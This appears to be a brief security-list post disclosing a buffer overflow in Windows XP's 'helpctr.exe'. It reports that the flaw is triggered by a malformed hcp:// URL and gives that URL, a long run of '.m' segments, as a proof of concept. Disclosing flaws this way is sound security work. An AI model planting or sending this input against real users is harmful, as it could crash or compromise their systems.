Hi,

I don't know if this has been reported before. I discovered an exploitable buffer \
overflow vulnerability in "helpctr.exe", which can enable an attacker to execute an \
arbitrary code on remote users with a malformed url.

Example :
"hcp://m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m \
.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m.m"
 Note : Dots are important do not remove them.

I'm using Windows XP Pro Build 2600
